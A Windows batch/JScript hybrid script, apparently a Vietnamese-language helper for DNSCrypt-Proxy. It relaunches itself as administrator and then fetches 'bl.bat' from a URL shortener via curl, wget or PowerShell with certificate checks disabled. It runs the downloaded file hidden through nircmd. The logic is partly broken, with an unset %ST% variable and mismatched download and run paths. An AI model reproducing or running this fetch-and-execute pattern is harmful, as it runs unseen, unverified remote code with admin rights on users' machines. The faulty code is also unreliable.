@set @_cmd=1 /*
@echo off
setlocal EnableExtensions
set "PhienBan=20200419a"
title DNSCrypt-Proxy %PhienBan%

rem ============================================================================
whoami /groups | findstr "S-1-16-12288" >nul && goto :admin
if "%~1"=="RunAsAdmin" goto :error

echo Dang lay quyen Administrator de quan ly duch vu DNSCrypt-Proxy . . .
cscript /nologo /e:javascript "%~f0" || goto :error
exit /b

:error
echo.
echo Vui long chay Scripts nay voi quyen Administrator
echo.
goto :end
rem ============================================================================

:admin
pushd "%~dp0"
set "TM=%cd%"
cls

if exist %ST%\curl.exe (
	echo.
	echo Dang tai Scripts bang cURL ...
	curl -sLko %TM%/bl.bat https://bom.to/bl_
	goto :chay
) else (
	xcopy .\curl\*.* "%ST%" /h/i/c/k/e/r/y
)

if exist %ST%\wget.exe (
	echo.
	echo Dang tai Scripts bang wGet ...
	wget -q --no-check-certificate https://bom.to/bl_ -O "C:\ProgramData\DNS\bl.bat"
	goto :chay
)

if exist %ST%\powershell.exe (
	echo.
	echo Dang tai Scripts bang PowerShell ...
	powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://bom.to/bl_', '%cd%\bl.bat') }"
	goto :chay
)

:chay
if exist %ST%\nircmd.exe (
	echo.
	nircmd exec hide "%TM%/bl.bat"
) else (
	xcopy .\cmd\*.* "%ST%" /h/i/c/k/e/r/y
)


:end
rem set /p =Press [Enter] to exit . . .
exit /b */

// JScript, restart batch script as administrator
var objShell = WScript.CreateObject('Shell.Application');
var ComSpec = WScript.CreateObject('WScript.Shell').ExpandEnvironmentStrings('%ComSpec%');
objShell.ShellExecute(ComSpec, '/c ""' + WScript.ScriptFullName + '" RunAsAdmin"', '', 'runas', 1);
